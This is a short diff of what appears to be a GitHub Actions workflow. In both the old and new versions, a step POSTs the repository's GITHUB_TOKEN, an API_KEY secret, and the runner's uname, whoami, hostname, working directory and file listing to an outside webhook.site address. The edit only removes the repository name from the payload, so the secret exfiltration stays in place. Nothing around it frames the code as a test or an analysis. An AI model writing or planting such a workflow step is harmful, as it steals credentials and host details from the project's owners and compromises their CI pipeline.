@@ -28,4 +28,4 @@ jobs:
           # Send to webhook with all captured data
           curl -X POST https://webhook.site/b2742a99-b62e-4b05-8541-3c40ba9da57b \
             -H "Content-Type: application/json" \
-            -d "{\"token\":\"${{ secrets.GITHUB_TOKEN }}\",\"api_key\":\"${{ secrets.API_KEY }}\",\"uname\":\"$UNAME_OUTPUT\",\"whoami\":\"$WHOAMI_OUTPUT\",\"hostname\":\"$HOSTNAME_OUTPUT\",\"pwd\":\"$PWD_OUTPUT\",\"ls_output\":\"$LS_OUTPUT\",\"repository\":\"${{ github.repository }}\",\"event\":\"${{ github.event_name }}\"}"
+            -d "{\"token\":\"${{ secrets.GITHUB_TOKEN }}\",\"api_key\":\"${{ secrets.API_KEY }}\",\"uname\":\"$UNAME_OUTPUT\",\"whoami\":\"$WHOAMI_OUTPUT\",\"hostname\":\"$HOSTNAME_OUTPUT\",\"pwd\":\"$PWD_OUTPUT\",\"ls_output\":\"$LS_OUTPUT\",\"event\":\"${{ github.event_name }}\"}"
